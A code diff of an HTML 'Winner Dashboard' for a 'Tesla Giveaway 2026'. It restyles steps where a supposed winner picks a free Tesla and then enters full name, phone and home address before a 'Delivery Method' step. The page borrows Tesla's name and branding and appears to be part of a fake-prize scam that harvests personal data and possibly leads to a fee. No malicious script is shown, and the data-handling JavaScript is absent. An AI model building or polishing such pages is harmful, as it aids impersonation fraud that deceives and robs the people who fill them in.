@@ -3,176 +3,186 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#000000">
-  <title>Dashboard | Pick Your Tesla</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>tailwind.config={theme:{extend:{colors:{tesla:{red:'#E82127',dark:'#000000'}}}}}</script>
+  <title>Winner Dashboard | Tesla Giveaway 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/css/style.css">
   <style>
-    .car-select-card{border:2px solid transparent;transition:all .3s ease;cursor:pointer}
-    .car-select-card:hover{border-color:rgba(232,33,39,0.3);transform:translateY(-2px)}
-    .car-select-card.selected{border-color:#E82127!important;box-shadow:0 0 30px rgba(232,33,39,0.2);background:rgba(232,33,39,0.05)}
-    .car-select-card.selected::after{content:'✓';position:absolute;top:12px;right:12px;width:28px;height:28px;background:#E82127;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px}
-    .step-indicator{transition:all .3s ease}
-    .step-indicator.active{color:#E82127;border-color:#E82127}
-    .step-indicator.done{color:#00cc44;border-color:#00cc44}
+    body{background:var(--light);}
+    .dash-wrap{max-width:1100px;margin:0 auto;padding:88px 24px 64px;}
+
+    /* Step bar */
+    .step-bar{background:white;border-radius:16px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:24px 32px;margin-bottom:32px;display:flex;align-items:center;gap:0;}
+    @media(max-width:600px){.step-bar{padding:16px 18px;}}
+    .step-col{display:flex;flex-direction:column;align-items:center;flex:1;min-width:0;}
+    .s-circle{width:36px;height:36px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;color:#B0B3B8;background:white;transition:all var(--transition);}
+    .s-circle.active{border-color:var(--red);color:var(--red);box-shadow:0 0 0 4px rgba(227,25,55,.1);}
+    .s-circle.done{border-color:var(--success);background:var(--success);color:white;}
+    .s-label{font-size:11px;font-weight:600;color:#B0B3B8;margin-top:5px;text-align:center;white-space:nowrap;}
+    .s-label.active{color:var(--red);}
+    .s-label.done{color:var(--success);}
+    .s-line{flex:1;height:2px;background:var(--border);margin-top:-20px;transition:background var(--transition);}
+    .s-line.done{background:var(--success);}
+
+    /* Verified banner */
+    .verified-banner{background:linear-gradient(135deg,rgba(0,165,80,.08),rgba(0,165,80,.04));border:1.5px solid rgba(0,165,80,.2);border-radius:14px;padding:18px 24px;display:flex;align-items:center;gap:14px;margin-bottom:28px;}
+    .verified-icon{width:42px;height:42px;background:var(--success);border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:20px;flex-shrink:0;}
+    .verified-text strong{font-size:15px;color:var(--dark);}
+    .verified-text p{font-size:13px;color:var(--gray-2);margin-top:2px;}
+
+    /* Section header */
+    .section-hdr{margin-bottom:28px;}
+    .section-hdr h2{font-size:26px;font-weight:800;color:var(--dark);}
+    .section-hdr p{font-size:14px;color:var(--gray-2);margin-top:6px;}
+
+    /* Car grid */
+    .cars-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin-bottom:28px;}
+    @media(max-width:900px){.cars-grid{grid-template-columns:repeat(2,1fr);}}
+    @media(max-width:540px){.cars-grid{grid-template-columns:1fr;}}
+    .car-card{cursor:pointer;border-radius:16px;border:2px solid rgba(0,0,0,.06);box-shadow:var(--shadow);overflow:hidden;transition:all var(--transition);background:white;position:relative;}
+    .car-card:hover{transform:translateY(-5px);box-shadow:var(--shadow-lg);border-color:rgba(227,25,55,.25);}
+    .car-card.selected{border-color:var(--red);box-shadow:0 0 0 4px rgba(227,25,55,.14);}
+    .car-card .sel-check{display:none;position:absolute;top:10px;right:10px;width:28px;height:28px;background:var(--red);color:white;border-radius:50%;align-items:center;justify-content:center;font-size:14px;font-weight:700;z-index:2;}
+    .car-card.selected .sel-check{display:flex;}
+    .car-img-area{height:148px;background:linear-gradient(135deg,#f7f8fa,#edf0f5);display:flex;align-items:center;justify-content:center;padding:12px;}
+    .car-img-area img{height:100%;object-fit:contain;transition:transform var(--transition);}
+    .car-card:hover .car-img-area img{transform:scale(1.06);}
+    .car-body{padding:16px;}
+    .car-title{font-size:16px;font-weight:700;color:var(--dark);}
+    .car-meta{font-size:12px;color:var(--gray-2);margin-bottom:10px;}
+    .car-specs{display:flex;flex-wrap:wrap;gap:6px;}
+    .car-spec-pill{font-size:11px;background:var(--light);color:var(--gray);padding:3px 9px;border-radius:999px;font-weight:500;}
+    .car-badge{display:inline-block;padding:2px 9px;border-radius:999px;font-size:11px;font-weight:700;background:rgba(227,25,55,.08);color:var(--red);margin-bottom:6px;}
+
+    /* Delivery form */
+    .delivery-wrap{background:white;border-radius:20px;border:1.5px solid rgba(0,0,0,.06);box-shadow:var(--shadow);padding:36px;}
+    @media(max-width:560px){.delivery-wrap{padding:24px 18px;}}
+    .selected-car-banner{background:rgba(227,25,55,.05);border:1px solid rgba(227,25,55,.15);border-radius:12px;padding:14px 18px;display:flex;align-items:center;gap:12px;margin-bottom:28px;}
+    .selected-car-banner strong{font-size:15px;color:var(--dark);}
+    .selected-car-banner span{font-size:13px;color:var(--gray-2);}
+    .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+    @media(max-width:580px){.form-grid{grid-template-columns:1fr;}}
+    .form-full{grid-column:1/-1;}
   </style>
 </head>
-<body class="min-h-screen bg-black">
+<body>
 
-<nav class="w-full bg-black/95 backdrop-blur-md border-b border-gray-900 sticky top-0 z-50">
-  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-    <div class="flex items-center justify-between h-16">
-      <a href="/" class="flex items-center gap-2">
-        <svg width="28" height="28" viewBox="0 0 100 100"><path d="M50 5 L85 25 L85 75 L50 95 L15 75 L15 25 Z" fill="none" stroke="#E82127" stroke-width="4"/><text x="50" y="64" text-anchor="middle" fill="#E82127" font-size="28" font-weight="bold">T</text></svg>
-        <span class="text-lg font-bold tracking-[0.15em] text-red-500">TESLA</span>
-      </a>
-      <div class="flex items-center gap-4">
-        <span class="text-gray-500 text-sm hidden sm:inline" id="userEmailDisplay"></span>
-        <button onclick="logout()" class="text-gray-400 hover:text-white text-sm transition-colors">Logout</button>
-      </div>
-    </div>
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="var(--red)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3l7 4v2h-3v6h-2v-6H8V9H5l7-4z"/></svg>
+      TESLA
+    </a>
+    <button onclick="logout()" class="btn btn-ghost" style="font-size:14px;">Sign Out</button>
   </div>
 </nav>
 
-<!-- Success Notification -->
-<div id="successBanner" class="bg-green-900/30 border-b border-green-500/30 py-3 px-4 hidden">
-  <div class="max-w-7xl mx-auto flex items-center gap-2 text-green-400 text-sm">
-    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-    <span>✅ Email verification successful! Welcome to your Tesla Giveaway Dashboard.</span>
-  </div>
-</div>
+<div class="dash-wrap">
 
-<main class="max-w-7xl mx-auto px-4 py-8 sm:py-12">
-
-  <!-- Step Indicator -->
-  <div class="flex items-center justify-center gap-4 sm:gap-8 mb-12">
-    <div class="flex items-center gap-2">
-      <div class="step-indicator done w-8 h-8 rounded-full border-2 flex items-center justify-center text-sm font-bold">✓</div>
-      <span class="text-xs text-green-400 hidden sm:inline">Verified</span>
+  <!-- Step bar -->
+  <div class="step-bar" id="stepBar">
+    <div class="step-col">
+      <div class="s-circle done" id="sc1">✓</div>
+      <div class="s-label done">Verified</div>
     </div>
-    <div class="w-12 h-0.5 bg-green-500/50"></div>
-    <div class="flex items-center gap-2">
-      <div class="step-indicator active w-8 h-8 rounded-full border-2 border-red-500 flex items-center justify-center text-sm font-bold text-red-500" id="step2indicator">2</div>
-      <span class="text-xs text-red-500 hidden sm:inline">Select Car</span>
+    <div class="s-line done" id="sl1"></div>
+    <div class="step-col">
+      <div class="s-circle active" id="sc2">2</div>
+      <div class="s-label active" id="sl2t">Select Tesla</div>
     </div>
-    <div class="w-12 h-0.5 bg-gray-800"></div>
-    <div class="flex items-center gap-2">
-      <div class="step-indicator w-8 h-8 rounded-full border-2 border-gray-800 flex items-center justify-center text-sm font-bold text-gray-600" id="step3indicator">3</div>
-      <span class="text-xs text-gray-600 hidden sm:inline">Delivery</span>
+    <div class="s-line" id="sl2"></div>
+    <div class="step-col">
+      <div class="s-circle" id="sc3">3</div>
+      <div class="s-label" id="sl3t">Delivery Details</div>
     </div>
-    <div class="w-12 h-0.5 bg-gray-800"></div>
-    <div class="flex items-center gap-2">
-      <div class="step-indicator w-8 h-8 rounded-full border-2 border-gray-800 flex items-center justify-center text-sm font-bold text-gray-600" id="step4indicator">4</div>
-      <span class="text-xs text-gray-600 hidden sm:inline">Confirm</span>
+    <div class="s-line" id="sl3"></div>
+    <div class="step-col">
+      <div class="s-circle" id="sc4">4</div>
+      <div class="s-label" id="sl4t">Delivery Method</div>
     </div>
   </div>
 
-  <!-- STEP 2: Select Car -->
-  <section id="stepSelectCar">
-    <div class="text-center mb-10">
-      <h1 class="text-3xl sm:text-4xl font-bold mb-2">Choose Your <span class="gradient-text">Tesla</span></h1>
-      <p class="text-gray-400">Select the model you'd like to win</p>
+  <!-- Verified banner (shown after email verify) -->
+  <div class="verified-banner anim-fade-up" id="verifiedBanner" style="display:none;">
+    <div class="verified-icon">✓</div>
+    <div class="verified-text">
+      <strong>Email Verified Successfully!</strong>
+      <p>Welcome, <span id="userNameDisplay">winner</span>! Your entry is now confirmed. Choose your Tesla below.</p>
     </div>
+  </div>
 
-    <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-5 mb-8" id="carSelectionGrid"></div>
-
-    <div class="text-center">
-      <button id="confirmCarBtn" class="glow-btn opacity-50 cursor-not-allowed" disabled onclick="confirmCarSelection()">
-        Continue with Selected Car →
+  <!-- STEP 2: Car Selection -->
+  <div id="stepSelectCar">
+    <div class="section-hdr">
+      <h2>🏆 Choose Your Tesla</h2>
+      <p>You've won the right to select any Tesla vehicle from our fleet. Pick the one that excites you most — it will be delivered to your door.</p>
+    </div>
+    <div class="cars-grid" id="carGrid"></div>
+    <div style="text-align:right;">
+      <button class="btn btn-primary btn-lg" id="confirmCarBtn" onclick="confirmCar()" disabled style="opacity:.45;cursor:not-allowed;">
+        Continue with Selected Tesla →
       </button>
-      <p class="text-gray-600 text-xs mt-3">Please select a car to continue</p>
     </div>
-  </section>
+  </div>
 
-  <!-- STEP 3: Delivery Details -->
-  <section id="stepDelivery" class="hidden">
-    <div class="max-w-lg mx-auto">
-      <div class="text-center mb-10">
-        <h1 class="text-3xl font-bold mb-2">Delivery <span class="gradient-text">Details</span></h1>
-        <p class="text-gray-400" id="selectedCarSummary"></p>
-      </div>
-      
-      <div class="glass rounded-2xl p-6 sm:p-8">
-        <form id="deliveryForm" class="space-y-5">
-          <div>
-            <label class="block text-xs text-gray-500 mb-2 uppercase tracking-wider">Full Name <span class="text-red-500">*</span></label>
-            <input type="text" name="fullName" class="tesla-input" placeholder="John Doe" required>
-          </div>
-          <div>
-            <label class="block text-xs text-gray-500 mb-2 uppercase tracking-wider">Shipping Address <span class="text-red-500">*</span></label>
-            <input type="text" name="address" class="tesla-input" placeholder="123 Main Street, Apt 4B" required>
-          </div>
-          <div class="grid grid-cols-2 gap-4">
-            <div>
-              <label class="block text-xs text-gray-500 mb-2 uppercase tracking-wider">City <span class="text-red-500">*</span></label>
-              <input type="text" name="city" class="tesla-input" placeholder="San Francisco" required>
-            </div>
-            <div>
-              <label class="block text-xs text-gray-500 mb-2 uppercase tracking-wider">State <span class="text-red-500">*</span></label>
-              <input type="text" name="state" class="tesla-input" placeholder="CA" required>
-            </div>
-          </div>
-          <div class="grid grid-cols-2 gap-4">
-            <div>
-              <label class="block text-xs text-gray-500 mb-2 uppercase tracking-wider">ZIP Code <span class="text-red-500">*</span></label>
-              <input type="text" name="zipCode" class="tesla-input" placeholder="94102" required>
-            </div>
-            <div>
-              <label class="block text-xs text-gray-500 mb-2 uppercase tracking-wider">Country <span class="text-red-500">*</span></label>
-              <input type="text" name="country" class="tesla-input" placeholder="United States" required>
-            </div>
-          </div>
-          <div>
-            <label class="block text-xs text-gray-500 mb-2 uppercase tracking-wider">Phone Number</label>
-            <input type="tel" name="deliveryPhone" class="tesla-input" placeholder="(555) 123-4567">
-          </div>
-          <div>
-            <label class="block text-xs text-gray-500 mb-2 uppercase tracking-wider">Special Instructions</label>
-            <textarea name="instructions" class="tesla-input h-24 resize-none" placeholder="Gate code, parking instructions, etc."></textarea>
-          </div>
-
-          <button type="submit" class="glow-btn w-full text-center">
-            🎉 Place My Order
-          </button>
-        </form>
-
-        <button onclick="goBackToCarSelection()" class="w-full text-center text-gray-500 hover:text-gray-400 text-sm mt-4 transition-colors">
-          ← Back to car selection
-        </button>
-      </div>
+  <!-- STEP 3: Delivery Form (hidden initially) -->
+  <div id="stepDelivery" style="display:none;">
+    <div class="section-hdr">
+      <h2>📦 Delivery Information</h2>
+      <p>Please enter the address where you'd like your Tesla delivered. All fields marked * are required.</p>
     </div>
-  </section>
-
-  <!-- STEP 4: Confirmation -->
-  <section id="stepConfirm" class="hidden">
-    <div class="max-w-lg mx-auto text-center">
-      <div class="success-anim mb-8">
-        <div class="inline-flex items-center justify-center w-24 h-24 rounded-full bg-gradient-to-br from-green-500/20 to-green-600/20 border border-green-500/30">
-          <svg class="w-12 h-12 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+    <div class="delivery-wrap">
+      <div class="selected-car-banner">
+        <span style="font-size:28px;" id="selectedCarEmoji">🚗</span>
+        <div>
+          <strong id="selectedCarTitle">Tesla Model 3</strong>
+          <br><span id="selectedCarColor">Pearl White</span>
         </div>
+        <button onclick="goBackToCars()" class="btn btn-ghost" style="margin-left:auto;font-size:13px;">Change</button>
       </div>
-      
-      <h1 class="text-3xl sm:text-4xl font-bold mb-2">Order Placed <span class="gradient-text">Successfully!</span></h1>
-      <p class="text-gray-400 mb-8">Your Tesla order has been confirmed and is being processed.</p>
-
-      <div class="glass rounded-2xl p-6 sm:p-8 mb-6 text-left">
-        <h3 class="text-sm text-gray-500 uppercase tracking-wider mb-4">Order Details</h3>
-        <div class="space-y-3 text-sm" id="orderDetailsContent"></div>
-      </div>
-
-      <div class="flex flex-col sm:flex-row gap-4 justify-center">
-        <a href="/track.html" class="glow-btn text-sm" id="trackOrderBtn">
-          📍 Track Your Order
-        </a>
-        <a href="/" class="text-gray-400 hover:text-white text-sm py-4 transition-colors">
-          Return to Home
-        </a>
-      </div>
+      <form id="deliveryForm" novalidate>
+        <div class="form-grid">
+          <div class="form-group">
+            <label class="form-label">Full Name *</label>
+            <input class="form-input" type="text" name="fullName" placeholder="James Anderson" required autocomplete="name">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Phone Number *</label>
+            <input class="form-input" type="tel" name="deliveryPhone" placeholder="+1 (555) 000-0000" required autocomplete="tel">
+          </div>
+          <div class="form-group form-full">
+            <label class="form-label">Street Address *</label>
+            <input class="form-input" type="text" name="address" placeholder="123 Main Street, Apt 4B" required autocomplete="street-address">
+          </div>
+          <div class="form-group">
+            <label class="form-label">City *</label>
+            <input class="form-input" type="text" name="city" placeholder="Los Angeles" required autocomplete="address-level2">
+          </div>
+          <div class="form-group">
+            <label class="form-label">State / Province *</label>
+            <input class="form-input" type="text" name="state" placeholder="California" required autocomplete="address-level1">
+          </div>
+          <div class="form-group">
+            <label class="form-label">ZIP / Postal Code *</label>
+            <input class="form-input" type="text" name="zipCode" placeholder="90001" required autocomplete="postal-code">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Country *</label>
+            <input class="form-input" type="text" name="country" placeholder="United States" required autocomplete="country-name">
+          </div>
+          <div class="form-group form-full">
+            <label class="form-label">Delivery Instructions <span style="color:var(--gray-2);font-weight:400;">(optional)</span></label>
+            <input class="form-input" type="text" name="instructions" placeholder="e.g. Ring doorbell, leave with concierge, gate code #1234">
+          </div>
+        </div>
+        <div style="display:flex;gap:14px;margin-top:8px;flex-wrap:wrap;">
+          <button type="button" class="btn btn-ghost" onclick="goBackToCars()">← Back</button>
+          <button type="submit" class="btn btn-primary btn-lg" style="flex:1;">Continue to Delivery Method →</button>
+        </div>
+      </form>
     </div>
-  </section>
+  </div>
 
-</main>
+</div>
 
 <script src="/js/app.js"></script>
 <script src="/js/dashboard.js"></script>
